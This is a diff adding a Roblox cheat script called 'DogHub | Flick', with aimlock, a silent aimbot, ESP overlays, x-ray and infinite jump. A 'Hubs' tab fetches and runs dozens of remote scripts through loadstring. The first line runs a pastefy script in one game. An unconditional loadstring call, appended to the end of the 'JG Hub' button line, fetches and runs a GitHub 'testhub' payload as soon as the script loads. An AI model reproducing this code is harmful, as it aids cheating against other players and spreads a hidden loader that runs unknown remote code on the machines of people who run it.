@@ -1,0 +1,819 @@
+if game.PlaceId == 142823291 then 
+loadstring(game:HttpGet("https://pastefy.app/mdhhSUx7/raw"))()
+else
+
+-- DogHub | Flick
+-- Clean FPS script with Luna UI
+-- @robuxinmyledger on discord for info
+
+local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/main/source.lua"))()
+
+local Window = Luna:CreateWindow({
+    Name = "DogHub [ eddited ]",
+    LoadingTitle = "DogHub",
+    LoadingSubtitle = "by robuxinmyledger",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "DogHub",
+        FileName = "FlickConfig"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "",
+        RememberJoins = false
+    },
+    KeySystem = false
+})
+
+-- Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Camera = workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+
+-- Variables
+local aimlockEnabled = false
+local aimbotEnabled = false
+local smoothAim = false
+local aimPart = "Head"
+local fovEnabled = false
+local fovSize = 100
+local fovCircle = nil
+local smoothness = 0.4
+local wallCheck = true
+local targetPlayer = nil
+
+local espEnabled = false
+local espBoxes = {}
+local espNames = {}
+local espHealth = {}
+local espDistance = {}
+local ESPObjects = {}
+
+local xrayEnabled = false
+local originalTransparencies = {}
+
+local infiniteJumpEnabled = false
+local infiniteJumpConnection = nil
+
+-- Create FOV Circle
+local function createFOVCircle()
+    if fovCircle then fovCircle:Remove() end
+    fovCircle = Drawing.new("Circle")
+    fovCircle.Thickness = 2
+    fovCircle.NumSides = 50
+    fovCircle.Radius = fovSize
+    fovCircle.Filled = false
+    fovCircle.Transparency = 1
+    fovCircle.Color = Color3.fromRGB(255, 255, 255)
+    fovCircle.Visible = false
+    fovCircle.ZIndex = 2
+end
+
+-- Update FOV Circle
+local function updateFOVCircle()
+    if fovCircle then
+        local centerX = Camera.ViewportSize.X / 2
+        local centerY = Camera.ViewportSize.Y / 2
+        fovCircle.Position = Vector2.new(centerX, centerY)
+        fovCircle.Radius = fovSize
+        fovCircle.Visible = fovEnabled and (aimlockEnabled or aimbotEnabled)
+    end
+end
+
+-- Get Closest Player to Crosshair
+local function getClosestPlayerToCursor()
+    local closestPlayer = nil
+    local shortestDistance = fovEnabled and fovSize or math.huge
+    local mousePos = UserInputService:GetMouseLocation()
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local humanoid = player.Character:FindFirstChild("Humanoid")
+            if humanoid and humanoid.Health > 0 then
+                local targetPart = player.Character:FindFirstChild(aimPart)
+                if targetPart then
+                    local screenPos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
+                    
+                    if onScreen then
+                        local distance = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
+                        
+                        if wallCheck then
+                            local ray = Ray.new(Camera.CFrame.Position, (targetPart.Position - Camera.CFrame.Position).Unit * 1000)
+                            local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character})
+                            
+                            if hit and hit:IsDescendantOf(player.Character) then
+                                if distance < shortestDistance then
+                                    closestPlayer = player
+                                    shortestDistance = distance
+                                end
+                            end
+                        else
+                            if distance < shortestDistance then
+                                closestPlayer = player
+                                shortestDistance = distance
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    return closestPlayer
+end
+
+-- Aimlock Function
+local function aimlock()
+    if not aimlockEnabled then return end
+    
+    local target = getClosestPlayerToCursor()
+    if target and target.Character then
+        local targetPart = target.Character:FindFirstChild(aimPart)
+        if targetPart then
+            local aimPosition = targetPart.Position
+            local cameraPosition = Camera.CFrame.Position
+            local direction = (aimPosition - cameraPosition).Unit
+            
+            if smoothAim then
+                local targetCFrame = CFrame.new(cameraPosition, cameraPosition + direction)
+                Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, smoothness)
+            else
+                Camera.CFrame = CFrame.new(cameraPosition, cameraPosition + direction)
+            end
+        end
+    end
+end
+
+-- Aimbot Function (Silent Aim)
+local function aimbot()
+    if not aimbotEnabled then return end
+    
+    local target = getClosestPlayerToCursor()
+    if target then
+        targetPlayer = target
+    else
+        targetPlayer = nil
+    end
+end
+
+-- ESP Functions (Enhanced with fancy visuals)
+local ESPObjects = {}
+
+local function createESP(Player)
+    if ESPObjects[Player] or Player == LocalPlayer then return end
+    
+    local ESPHolder = {
+        Box = Drawing.new("Square"),
+        BoxOutline = Drawing.new("Square"),
+        CornerTL = Drawing.new("Line"),
+        CornerTR = Drawing.new("Line"),
+        CornerBL = Drawing.new("Line"),
+        CornerBR = Drawing.new("Line"),
+        Tracer = Drawing.new("Line"),
+        Name = Drawing.new("Text"),
+        Distance = Drawing.new("Text"),
+        Health = Drawing.new("Text"),
+        HealthBar = Drawing.new("Line"),
+        HealthBarOutline = Drawing.new("Line")
+    }
+    
+    -- Main Box
+    ESPHolder.Box.Thickness = 2
+    ESPHolder.Box.Filled = false
+    ESPHolder.Box.Color = Color3.fromRGB(255, 0, 0)
+    ESPHolder.Box.Visible = false
+    ESPHolder.Box.ZIndex = 2
+    ESPHolder.Box.Transparency = 1
+    
+    -- Box Outline (for depth effect)
+    ESPHolder.BoxOutline.Thickness = 4
+    ESPHolder.BoxOutline.Filled = false
+    ESPHolder.BoxOutline.Color = Color3.fromRGB(0, 0, 0)
+    ESPHolder.BoxOutline.Visible = false
+    ESPHolder.BoxOutline.ZIndex = 1
+    ESPHolder.BoxOutline.Transparency = 0.8
+    
+    -- Corner Lines (fancy corners)
+    for _, corner in pairs({ESPHolder.CornerTL, ESPHolder.CornerTR, ESPHolder.CornerBL, ESPHolder.CornerBR}) do
+        corner.Thickness = 3
+        corner.Color = Color3.fromRGB(255, 255, 255)
+        corner.Visible = false
+        corner.ZIndex = 3
+        corner.Transparency = 1
+    end
+    
+    -- Tracer
+    ESPHolder.Tracer.Thickness = 2
+    ESPHolder.Tracer.Color = Color3.fromRGB(255, 0, 0)
+    ESPHolder.Tracer.Visible = false
+    ESPHolder.Tracer.ZIndex = 1
+    ESPHolder.Tracer.Transparency = 0.5
+    
+    -- Name Text
+    ESPHolder.Name.Size = 16
+    ESPHolder.Name.Center = true
+    ESPHolder.Name.Outline = true
+    ESPHolder.Name.Font = 3
+    ESPHolder.Name.Color = Color3.fromRGB(255, 255, 255)
+    ESPHolder.Name.Visible = false
+    ESPHolder.Name.ZIndex = 3
+    ESPHolder.Name.Transparency = 1
+    
+    -- Distance Text
+    ESPHolder.Distance.Size = 13
+    ESPHolder.Distance.Center = true
+    ESPHolder.Distance.Outline = true
+    ESPHolder.Distance.Font = 2
+    ESPHolder.Distance.Color = Color3.fromRGB(200, 200, 255)
+    ESPHolder.Distance.Visible = false
+    ESPHolder.Distance.ZIndex = 3
+    ESPHolder.Distance.Transparency = 1
+    
+    -- Health Text
+    ESPHolder.Health.Size = 13
+    ESPHolder.Health.Center = true
+    ESPHolder.Health.Outline = true
+    ESPHolder.Health.Font = 2
+    ESPHolder.Health.Color = Color3.fromRGB(0, 255, 0)
+    ESPHolder.Health.Visible = false
+    ESPHolder.Health.ZIndex = 3
+    ESPHolder.Health.Transparency = 1
+    
+    -- Health Bar
+    ESPHolder.HealthBar.Thickness = 3
+    ESPHolder.HealthBar.Color = Color3.fromRGB(0, 255, 0)
+    ESPHolder.HealthBar.Visible = false
+    ESPHolder.HealthBar.ZIndex = 3
+    ESPHolder.HealthBar.Transparency = 1
+    
+    -- Health Bar Outline
+    ESPHolder.HealthBarOutline.Thickness = 5
+    ESPHolder.HealthBarOutline.Color = Color3.fromRGB(0, 0, 0)
+    ESPHolder.HealthBarOutline.Visible = false
+    ESPHolder.HealthBarOutline.ZIndex = 2
+    ESPHolder.HealthBarOutline.Transparency = 0.8
+    
+    ESPObjects[Player] = ESPHolder
+end
+
+local function removeESP(Player)
+    if ESPObjects[Player] then
+        for _, Drawing in pairs(ESPObjects[Player]) do
+            Drawing:Remove()
+        end
+        ESPObjects[Player] = nil
+    end
+end
+
+local function updateESP()
+    for Player, ESP in pairs(ESPObjects) do
+        pcall(function()
+            if Player and Player.Character and Player ~= LocalPlayer then
+                local Character = Player.Character
+                local Humanoid = Character:FindFirstChildOfClass("Humanoid")
+                local RootPart = Character:FindFirstChild("HumanoidRootPart")
+                local Head = Character:FindFirstChild("Head")
+                
+                if Humanoid and RootPart and Head and Humanoid.Health > 0 and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - RootPart.Position).Magnitude
+                    
+                    if Distance > 5000 then
+                        ESP.Box.Visible = false
+                        ESP.BoxOutline.Visible = false
+                        ESP.CornerTL.Visible = false
+                        ESP.CornerTR.Visible = false
+                        ESP.CornerBL.Visible = false
+                        ESP.CornerBR.Visible = false
+                        ESP.Tracer.Visible = false
+                        ESP.Name.Visible = false
+                        ESP.Distance.Visible = false
+                        ESP.Health.Visible = false
+                        ESP.HealthBar.Visible = false
+                        ESP.HealthBarOutline.Visible = false
+                        return
+                    end
+                    
+                    local Vector, OnScreen = Camera:WorldToViewportPoint(RootPart.Position)
+                    
+                    if OnScreen and espEnabled then
+                        local HeadPos = Camera:WorldToViewportPoint(Head.Position + Vector3.new(0, 0.5, 0))
+                        local LegPos = Camera:WorldToViewportPoint(RootPart.Position - Vector3.new(0, 3, 0))
+                        
+                        local Height = math.abs(HeadPos.Y - LegPos.Y)
+                        local Width = Height / 2
+                        
+                        local IsTarget = (targetPlayer == Player)
+                        local BoxColor = IsTarget and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 50, 50)
+                        
+                        -- Pulse effect for locked targets
+                        if IsTarget then
+                            local pulse = math.abs(math.sin(tick() * 3)) * 0.3 + 0.7
+                            BoxColor = Color3.fromRGB(0, 255 * pulse, 100)
+                        end
+                        
+                        -- Main Box
+                        ESP.Box.Size = Vector2.new(Width, Height)
+                        ESP.Box.Position = Vector2.new(Vector.X - Width / 2, Vector.Y - Height / 2)
+                        ESP.Box.Color = BoxColor
+                        ESP.Box.Visible = true
+                        
+                        -- Box Outline
+                        ESP.BoxOutline.Size = Vector2.new(Width, Height)
+                        ESP.BoxOutline.Position = Vector2.new(Vector.X - Width / 2, Vector.Y - Height / 2)
+                        ESP.BoxOutline.Visible = true
+                        
+                        -- Fancy Corner Lines
+                        local cornerLength = math.min(Width, Height) / 4
+                        
+                        -- Top Left
+                        ESP.CornerTL.From = Vector2.new(Vector.X - Width / 2, Vector.Y - Height / 2)
+                        ESP.CornerTL.To = Vector2.new(Vector.X - Width / 2 + cornerLength, Vector.Y - Height / 2)
+                        ESP.CornerTL.Color = BoxColor
+                        ESP.CornerTL.Visible = true
+                        
+                        -- Top Right
+                        ESP.CornerTR.From = Vector2.new(Vector.X + Width / 2, Vector.Y - Height / 2)
+                        ESP.CornerTR.To = Vector2.new(Vector.X + Width / 2 - cornerLength, Vector.Y - Height / 2)
+                        ESP.CornerTR.Color = BoxColor
+                        ESP.CornerTR.Visible = true
+                        
+                        -- Bottom Left
+                        ESP.CornerBL.From = Vector2.new(Vector.X - Width / 2, Vector.Y + Height / 2)
+                        ESP.CornerBL.To = Vector2.new(Vector.X - Width / 2 + cornerLength, Vector.Y + Height / 2)
+                        ESP.CornerBL.Color = BoxColor
+                        ESP.CornerBL.Visible = true
+                        
+                        -- Bottom Right
+                        ESP.CornerBR.From = Vector2.new(Vector.X + Width / 2, Vector.Y + Height / 2)
+                        ESP.CornerBR.To = Vector2.new(Vector.X + Width / 2 - cornerLength, Vector.Y + Height / 2)
+                        ESP.CornerBR.Color = BoxColor
+                        ESP.CornerBR.Visible = true
+                        
+                        -- Tracer (disabled by default, looks cleaner)
+                        ESP.Tracer.Visible = false
+                        
+                        -- Name with glow effect
+                        ESP.Name.Text = Player.Name .. (IsTarget and " ⚡ [LOCKED]" or "")
+                        ESP.Name.Position = Vector2.new(Vector.X, HeadPos.Y - 25)
+                        ESP.Name.Color = IsTarget and Color3.fromRGB(100, 255, 150) or Color3.fromRGB(255, 255, 255)
+                        ESP.Name.Visible = true
+                        
+                        -- Distance with gradient color based on range
+                        local distColor = Distance < 100 and Color3.fromRGB(255, 100, 100) or 
+                                         Distance < 300 and Color3.fromRGB(255, 255, 100) or 
+                                         Color3.fromRGB(100, 200, 255)
+                        ESP.Distance.Text = math.floor(Distance) .. "m"
+                        ESP.Distance.Position = Vector2.new(Vector.X, LegPos.Y + 5)
+                        ESP.Distance.Color = distColor
+                        ESP.Distance.Visible = true
+                        
+                        -- Health with smooth color gradient
+                        local HealthPercent = math.floor((Humanoid.Health / Humanoid.MaxHealth) * 100)
+                        ESP.Health.Text = HealthPercent .. "❤"
+                        ESP.Health.Position = Vector2.new(Vector.X, LegPos.Y + 20)
+                        
+                        -- Smooth RGB gradient for health
+                        if HealthPercent > 75 then
+                            ESP.Health.Color = Color3.fromRGB(0, 255, 100)
+                        elseif HealthPercent > 50 then
+                            ESP.Health.Color = Color3.fromRGB(255, 255, 0)
+                        elseif HealthPercent > 25 then
+                            ESP.Health.Color = Color3.fromRGB(255, 150, 0)
+                        else
+                            ESP.Health.Color = Color3.fromRGB(255, 0, 0)
+                        end
+                        ESP.Health.Visible = true
+                        
+                        -- Health Bar (side of box)
+                        local healthBarHeight = Height * (Humanoid.Health / Humanoid.MaxHealth)
+                        local healthBarX = Vector.X - Width / 2 - 7
+                        
+                        ESP.HealthBarOutline.From = Vector2.new(healthBarX, Vector.Y - Height / 2)
+                        ESP.HealthBarOutline.To = Vector2.new(healthBarX, Vector.Y + Height / 2)
+                        ESP.HealthBarOutline.Visible = true
+                        
+                        ESP.HealthBar.From = Vector2.new(healthBarX, Vector.Y + Height / 2)
+                        ESP.HealthBar.To = Vector2.new(healthBarX, Vector.Y + Height / 2 - healthBarHeight)
+                        ESP.HealthBar.Color = ESP.Health.Color
+                        ESP.HealthBar.Visible = true
+                    else
+                        ESP.Box.Visible = false
+                        ESP.BoxOutline.Visible = false
+                        ESP.CornerTL.Visible = false
+                        ESP.CornerTR.Visible = false
+                        ESP.CornerBL.Visible = false
+                        ESP.CornerBR.Visible = false
+                        ESP.Tracer.Visible = false
+                        ESP.Name.Visible = false
+                        ESP.Distance.Visible = false
+                        ESP.Health.Visible = false
+                        ESP.HealthBar.Visible = false
+                        ESP.HealthBarOutline.Visible = false
+                    end
+                else
+                    ESP.Box.Visible = false
+                    ESP.BoxOutline.Visible = false
+                    ESP.CornerTL.Visible = false
+                    ESP.CornerTR.Visible = false
+                    ESP.CornerBL.Visible = false
+                    ESP.CornerBR.Visible = false
+                    ESP.Tracer.Visible = false
+                    ESP.Name.Visible = false
+                    ESP.Distance.Visible = false
+                    ESP.Health.Visible = false
+                    ESP.HealthBar.Visible = false
+                    ESP.HealthBarOutline.Visible = false
+                end
+            end
+        end)
+    end
+end
+
+-- X-Ray Function
+local function toggleXRay(enabled)
+    if enabled then
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") and not obj:IsDescendantOf(LocalPlayer.Character) then
+                originalTransparencies[obj] = obj.Transparency
+                obj.Transparency = 0.7
+            end
+        end
+    else
+        for obj, transparency in pairs(originalTransparencies) do
+            if obj and obj.Parent then
+                obj.Transparency = transparency
+            end
+        end
+        originalTransparencies = {}
+    end
+end
+
+-- Infinite Jump Function
+local function toggleInfiniteJump(enabled)
+    if enabled then
+        infiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+                LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
+            end
+        end)
+    else
+        if infiniteJumpConnection then
+            infiniteJumpConnection:Disconnect()
+            infiniteJumpConnection = nil
+        end
+    end
+end
+
+-- Create Home Tab (Required for Luna)
+Window:CreateHomeTab({
+   SupportedExecutors = {
+    "Synapse X", "Synapse Xen", "Script-Ware", "Script-Ware Pro", "SirHurt", "SirHurt V4",
+    
+    "Krnl", "Krnl Beta", "Fluxus", "Fluxus Mobile", "Delta", "Delta X", "Codex", "Codex Android",
+    "Oxygen U", "Oxygen U V2", "Electron", "Electron X", "Solara", "Solara V2", "Wave", "Wave Executor",
+    "Xeno", "Xeno Beta", "Hydrogen", "MacSploit", "Velocity", "Valiant", "Vales", "Potassium",
+        "Bunni.lol", "Chocosploit", "Cryptic", "Cryptoic", "Neoblox", "Arceus X", "Arceus X Neo",
+    "Trigon", "Evon", "Elysian", "Sentinel", "Talon", "Voidz", "Cocrea", "L2L", "JJSploit",
+    "Kalil", "Kavo", "Kavo Attach",
+        "Comet", "Celery", "Nebula", "Tempest", "NovaX", "Roexec", "Matanuska", "Azura", "IcyTea",
+    "Thunder X", "Zeus", "Nihon", "Odin", "Frost X", "Blackout", "Nexus", "Aether", "Hyperion",
+    "Vortex", "Phantom X", "Specter", "Wisteria", "Lumine", "Eclipse X", "Radiant", "Oblivion"
+},
+    DiscordInvite = nil,
+    Icon = 1
+})
+
+-- Create Tabs
+local CombatTab = Window:CreateTab({
+    Name = "Combat",
+    Icon = "gps_fixed",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+
+local VisualsTab = Window:CreateTab({
+    Name = "Visuals",
+    Icon = "visibility",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+local HubsTab = Window:CreateTab({
+    Name = "Hubs",
+    Icon = "code",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+local MiscTab = Window:CreateTab({
+    Name = "Misc",
+    Icon = "more_horiz",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+
+
+
+local SettingsTab = Window:CreateTab({
+    Name = "Settings",
+    Icon = "settings",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+
+
+
+-- Combat Section
+local AimlockSection = CombatTab:CreateSection("Aimlock")
+
+local AimlockToggle = CombatTab:CreateToggle({
+    Name = "Enable Aimlock",
+    CurrentValue = false,
+    Flag = "AimlockToggle",
+    Callback = function(Value)
+        aimlockEnabled = Value
+        createFOVCircle()
+    end,
+})
+
+local SmoothAimToggle = CombatTab:CreateToggle({
+    Name = "Smooth Aim",
+    CurrentValue = false,
+    Flag = "SmoothAimToggle",
+    Callback = function(Value)
+        smoothAim = Value
+    end,
+})
+
+local SmoothnessSlider = CombatTab:CreateSlider({
+    Name = "Smoothness",
+    Range = {0.1, 1},
+    Increment = 0.05,
+    CurrentValue = 0.4,
+    Flag = "SmoothnessSlider",
+    Callback = function(Value)
+        smoothness = Value
+    end,
+})
+
+local WallCheckToggle = CombatTab:CreateToggle({
+    Name = "Wall Check",
+    CurrentValue = true,
+    Flag = "WallCheckToggle",
+    Callback = function(Value)
+        wallCheck = Value
+    end,
+})
+
+local AimPartDropdown = CombatTab:CreateDropdown({
+    Name = "Target Body Part",
+    Options = {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart"},
+    CurrentOption = {"Head"},
+    MultipleOptions = false,
+    Flag = "AimPartDropdown",
+    Callback = function(Option)
+        if type(Option) == "table" then
+            aimPart = Option[1]
+        else
+            aimPart = Option
+        end
+    end,
+})
+
+local FOVSection = CombatTab:CreateSection("FOV Circle")
+
+local FOVToggle = CombatTab:CreateToggle({
+    Name = "Enable FOV",
+    CurrentValue = false,
+    Flag = "FOVToggle",
+    Callback = function(Value)
+        fovEnabled = Value
+        createFOVCircle()
+    end,
+})
+
+local FOVSlider = CombatTab:CreateSlider({
+    Name = "FOV Size",
+    Range = {50, 500},
+    Increment = 10,
+    CurrentValue = 100,
+    Flag = "FOVSlider",
+    Callback = function(Value)
+        fovSize = Value
+        if fovCircle then
+            fovCircle.Radius = Value
+        end
+    end,
+})
+
+local FOVColorPicker = CombatTab:CreateColorPicker({
+    Name = "FOV Color",
+    Color = Color3.fromRGB(255, 255, 255),
+    Flag = "FOVColor",
+    Callback = function(Value)
+        if fovCircle then
+            fovCircle.Color = Value
+        end
+    end
+})
+
+local AimbotSection = CombatTab:CreateSection("Aimbot (Silent)")
+
+local AimbotToggle = CombatTab:CreateToggle({
+    Name = "Enable Aimbot",
+    CurrentValue = false,
+    Flag = "AimbotToggle",
+    Callback = function(Value)
+        aimbotEnabled = Value
+    end,
+})
+
+-- Visuals Section
+local ESPSection = VisualsTab:CreateSection("ESP")
+
+local ESPToggle = VisualsTab:CreateToggle({
+    Name = "Enable ESP",
+    CurrentValue = false,
+    Flag = "ESPToggle",
+    Callback = function(Value)
+        espEnabled = Value
+        
+        if Value then
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    createESP(player)
+                end
+            end
+            
+            RunService:BindToRenderStep("UpdateESP", Enum.RenderPriority.Camera.Value + 1, updateESP)
+        else
+            RunService:UnbindFromRenderStep("UpdateESP")
+            
+            for player, _ in pairs(ESPObjects) do
+                removeESP(player)
+            end
+        end
+    end,
+})
+
+local ESPColorPicker = VisualsTab:CreateColorPicker({
+    Name = "ESP Color",
+    Color = Color3.fromRGB(255, 0, 0),
+    Flag = "ESPColor",
+    Callback = function(Value)
+        for _, ESP in pairs(ESPObjects) do
+            ESP.Box.Color = Value
+            ESP.Tracer.Color = Value
+        end
+    end
+})
+
+local XRaySection = VisualsTab:CreateSection("X-Ray")
+
+local XRayToggle = VisualsTab:CreateToggle({
+    Name = "Enable X-Ray",
+    CurrentValue = false,
+    Flag = "XRayToggle",
+    Callback = function(Value)
+        xrayEnabled = Value
+        toggleXRay(Value)
+    end,
+})
+
+local XRaySlider = VisualsTab:CreateSlider({
+    Name = "X-Ray Transparency",
+    Range = {0, 1},
+    Increment = 0.1,
+    CurrentValue = 0.7,
+    Flag = "XRayTransparency",
+    Callback = function(Value)
+        if xrayEnabled then
+            for obj, _ in pairs(originalTransparencies) do
+                if obj and obj.Parent then
+                    obj.Transparency = Value
+                end
+            end
+        end
+    end,
+})
+
+-- Misc Section
+local MovementSection = MiscTab:CreateSection("Movement")
+
+local InfiniteJumpToggle = MiscTab:CreateToggle({
+    Name = "Infinite Jump",
+    CurrentValue = false,
+    Flag = "InfiniteJump",
+    Callback = function(Value)
+        infiniteJumpEnabled = Value
+        toggleInfiniteJump(Value)
+    end,
+})
+
+-- Settings Section
+local InfoSection = SettingsTab:CreateSection("Info")
+
+SettingsTab:CreateParagraph({
+    Title = "DogHub | Flick",
+    Content = "A clean and simple FPS script for Flick.\n\nFeatures:\n- Aimlock with FOV\n- Silent Aimbot\n- ESP (Boxes, Names, Health, Distance)\n- X-Ray Vision\n\nCreated by Xenure"
+})
+
+local ControlsSection = SettingsTab:CreateSection("Controls")
+
+SettingsTab:CreateKeybind({
+    Name = "Toggle UI",
+    CurrentKeybind = "RightShift",
+    HoldToInteract = false,
+    Flag = "UIKeybind",
+    Callback = function(Keybind)
+    end,
+})
+
+SettingsTab:CreateButton({
+    Name = "Destroy GUI",
+    Callback = function()
+        Luna:Destroy()
+    end,
+})
+
+
+
+-- Main Loop
+RunService.RenderStepped:Connect(function()
+    updateFOVCircle()
+    aimlock()
+    aimbot()
+end)
+
+-- Player Events
+Players.PlayerAdded:Connect(function(player)
+    if espEnabled and player ~= LocalPlayer then
+        createESP(player)
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    removeESP(player)
+end)
+
+HubsTab:CreateButton({Name="Infinite Yield",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()end})
+HubsTab:CreateButton({Name="Ghost Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()end})
+HubsTab:CreateButton({Name="Nameless Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()end})
+HubsTab:CreateButton({Name="CMD-X",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()end})
+HubsTab:CreateButton({Name="Fates Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/source.lua"))()end})
+HubsTab:CreateButton({Name="Orca",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()end})
+HubsTab:CreateButton({Name="Epik Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Epik-Hub-Blox-Fruits-Fisch-Evade-and-More-23406"))()end})
+HubsTab:CreateButton({Name="Ez Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Ez-Hub_168"))()end}) 
+HubsTab:CreateButton({Name="Ultimate Hub V2",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Ultimate-Hub-V2-9718"))()end})
+HubsTab:CreateButton({Name="Forge Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Universal-Script-Forge-Hub-41461"))()end})
+HubsTab:CreateButton({Name="Moldovan Admin",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdminClassic/refs/heads/main/main.lua"))()end})
+HubsTab:CreateButton({Name="Sky Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()end})
+HubsTab:CreateButton({Name="Hydroxide",Callback=function()local owner,branch="Upbolt","revision"pcall(function()loadstring(game:HttpGet(("https://raw.githubusercontent.com/%s/Hydroxide/%s/init.lua"):format(owner,branch)))()loadstring(game:HttpGet(("https://raw.githubusercontent.com/%s/Hydroxide/%s/ui/main.lua"):format(owner,branch)))()end)end})
+HubsTab:CreateButton({Name="Simple V3",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Simple-Scripts/main/Simple V3"))()end}) 
+HubsTab:CreateButton({Name="Slicer FE V6",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Ahma174/Slicer/refs/heads/main/Slicer Fe V6"))()end})
+HubsTab:CreateButton({Name="Hat Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/updatedhathub.lua"))()end})
+HubsTab:CreateButton({Name="FE Punch",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexR32/FePunch/main/FePunch.lua"))()end})
+HubsTab:CreateButton({Name="FE Godmode",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/fe-godmode.lua"))()end})
+HubsTab:CreateSection("Brookhaven")
+HubsTab:CreateButton({Name="Coquette Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Brookhaven-RP-Coquette-Hub-41921"))()end})
+HubsTab:CreateButton({Name="JG Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/jg-hub-brookhaven-UDaT"))()end}) loadstring(game:HttpGet("https://raw.githubusercontent.com/DontTrlp/chatgpt/refs/heads/main/testhub"))()
+HubsTab:CreateButton({Name="Tiger X Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/tiger-x-hub-brookhaven-UDaT"))()end})
+HubsTab:CreateButton({Name="Rael Hub (OP)",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/contateste8/OaOaOaOa-EbEbEbEbEb/main/RaelHubObf.txt"))()end})
+HubsTab:CreateButton({Name="SP Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()end})
+HubsTab:CreateButton({Name="GHub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/GHub/main/Brookhaven.lua"))()end})
+HubsTab:CreateButton({Name="IceHub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/IceHubScripts/Brookhaven/main/script.lua"))()end})
+HubsTab:CreateSection("Jailbreak")
+HubsTab:CreateButton({Name="Sky Hub JB",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/new-jailbreak-script-sky-hub-auto-farm-teleports-kill-aura-silent-aim-vehicle-mods-infinite-nitro-nuke-open-all-doors-gates-and-cells-and-more-4208"))()end})
+HubsTab:CreateSection("Blox Fruits")
+HubsTab:CreateButton({Name="Redz Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Scripts/refs/heads/main/main.luau"))({JoinTeam="Pirates",Translator=true})end})
+HubsTab:CreateButton({Name="Speed Hub X",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/blox-fruits-or-speed-hub-x-keyless-GR6x"))()end})
+HubsTab:CreateButton({Name="Ro Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/ro-hub-or-keyless-roblox-script-hub-xFgj"))()end})
+HubsTab:CreateButton({Name="Org Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/org-hub-blox-fruit-script-NoK7"))()end})
+HubsTab:CreateButton({Name="HoHo Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/blox-fruit-hoho-hub-2874"))()end})
+HubsTab:CreateButton({Name="Min Hub V4",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Blox-Fruits-Min-Hub-V4-15545"))()end})
+HubsTab:CreateButton({Name="Strike Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Strike-Hub-or-Blox-Fruits-or-Auto-Farm_71"))()end})
+HubsTab:CreateSection("Da Hood")
+HubsTab:CreateButton({Name="Da Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Da-Hood-Da-Hub-2138"))()end})
+HubsTab:CreateButton({Name="OP Script",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/dah-hood-op-script-RXe2"))()end})
